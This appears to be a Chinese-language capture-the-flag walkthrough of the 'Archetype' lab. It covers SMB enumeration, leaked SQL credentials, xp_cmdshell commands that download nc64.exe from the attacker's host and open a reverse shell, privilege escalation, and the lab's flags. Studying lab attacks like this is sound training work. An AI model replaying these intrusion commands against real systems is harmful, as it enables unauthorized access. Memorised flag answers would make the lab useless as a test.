# Archetype
### hackmd link:[hackmd](https://hackmd.io/@yeyeye618/SJBntzcCJx)
![image](https://hackmd.io/_uploads/rkLJMu5C1e.png)

Task 1
---
Which TCP port is hosting a database server?
A: 1433
第1題問哪個tcp port負責資料庫server
用nmap來掃
```
nmap -sV 10.129.95.187
```
![image](https://hackmd.io/_uploads/r1WYqzcRJx.png)
就可以看到Microsoft SQL Server 2017 14.00.1000跑在1433 port上


Task 2
---
What is the name of the non-Administrative share available over SMB?
A: backups
這題問的是哪個是在SMB下，哪個directory是非管理者就能存取的，SMB的連線方式在之前的靶機也有出現過
```
smbclient -L 10.129.95.187
Password for [WORKGROUP\yeyeye618]: //留空
```
![image](https://hackmd.io/_uploads/rkHmpfqCke.png)
可以看到有較backups的directory

Task 3
---
What is the password identified in the file on the SMB share?
A:M3g4c0rp123
上一題有看到backups的directory，用`smbclient`連線進去
```
smbclient //10.129.95.187/backups
Password for [WORKGROUP\yeyeye618]: //留空
```
![image](https://hackmd.io/_uploads/ryvbRMq0kl.png)
可以看到有個叫`prod.dtsConfig`的檔案，看起來是config，把他抓下來看看
![image](https://hackmd.io/_uploads/rkchAG9Cke.png)
找到了UserId跟Password

Task 4
---
What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?
A: mssqlclient.py
![image](https://hackmd.io/_uploads/B1YRfmq01g.png)

Task 5
---
What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
A: xp_cmdshell
在MSSQL的document找到了`xp_cmdshell`
![image](https://hackmd.io/_uploads/rkUSVX90Jg.png)
依照這題跟上一題的提示，我先用mssqlclient.py連線到server
```bash
python3 mssqlclient.py -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```
![image](https://hackmd.io/_uploads/S1SIjX5Rkg.png)
一開始一直登入不進去，研究後才發現需要加上`-windows-auth`，要不然就會當成SQL server帳號做登入

Task 6
---
What script can be used in order to search possible paths to escalate privileges on Windows hosts?
A: winPEAS
![image](https://hackmd.io/_uploads/SJNA4Q9AJe.png)

Task 7
---
What file contains the administrator's password?
A: ConsoleHost_history.txt
這裡我一直找不到，最後去看official writeup
在writeup裡提到了要用reverse shell
從github上把nc64.exe抓下來後架起http.server
```
python3 -m http.server 8080
```
再從impacket這邊從本地抓到server上做reverse shell
```
 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; 
 wget http://10.10.14.43/nc64.exe -outfile nc64.exe"
```
![image](https://hackmd.io/_uploads/ry8zF490kl.png)
接下來執行上傳好的nc64.exe
```
 exec xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; ./nc64.exe -e cmd.exe 10.10.14.43 8080"
```
本地就成功打到reverse shell了
![image](https://hackmd.io/_uploads/rJfhYEqRyg.png)
但是我們的權限還是只有在sql_svc，還需要提權到Administrator
值錢的題目就提到了winpeas這個工具，看起來就是突破口
上傳完後執行
![image](https://hackmd.io/_uploads/BkJ47r5Cyg.png)
可以看到這個ConsoleHost_history.txt

Task 8
---
Submit user flag
A: 3e7b102e78218e935bf3f4951fec21a3
在Desktop找到了`user.txt`，裡面就是user flag
![image](https://hackmd.io/_uploads/ByFxDHqRye.png)


Submit root flag
---
過程:
接續第7題，把ConsoleHost_history.txt撈出來
![image](https://hackmd.io/_uploads/SyxOPS50yg.png)
可以看到administrator的相關資料
用impacket底下的`psexec.py`做遠端執行
![image](https://hackmd.io/_uploads/B1G3tSq0ke.png)
在相同的地方找到了`root.txt`，撈出來
![image](https://hackmd.io/_uploads/r1qXqB9RJg.png)
成功取得flag
`b91ccec3305e98240082d4474b848528`



mssqlclient.py
---
`mssqlclient.py` 是 Impacket 工具集中專門用於與 Microsoft SQL Server 建立連線的腳本。它適用於需要進行 SQL Server 認證測試、執行 SQL 查詢、以及進一步進行滲透測試的情況。

### 適用情況
- 當需要對目標 Microsoft SQL Server 進行身份驗證測試時。
- 當需要執行 SQL 查詢或操作資料庫時。
- 當需要利用 SQL Server 的功能進行進一步的滲透測試（例如執行命令或提權）時。

### 主要功能
1. 支援 SQL Server 和 Windows 驗證模式（需使用 `-windows-auth` 參數）。
2. 執行 SQL 查詢並返回結果。
3. 支援執行 SQL Server 的擴展存儲過程（如 `xp_cmdshell`）。
4. 可用於執行命令以進一步滲透（例如上傳檔案或建立反向 Shell）。

### 優點
- 簡單易用，適合快速測試和滲透。
- 支援多種驗證模式，靈活性高。
- 與其他 Impacket 工具無縫整合，適合進行多步驟的滲透測試。

### 缺點
- 需要具備有效的憑證（如帳號和密碼）才能成功連線。
- 如果目標伺服器禁用了某些功能（如 `xp_cmdshell`），可能會限制其用途。
- 依賴 Python 環境，可能需要額外安裝依賴。

### 使用範例
以下是使用 `mssqlclient.py` 連線到 SQL Server 並執行命令的範例：
```bash
python3 mssqlclient.py -p 1433 ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```
在連線後，可以執行 SQL 查詢或使用 `xp_cmdshell` 執行系統命令：
```sql
EXEC xp_cmdshell 'whoami';
```
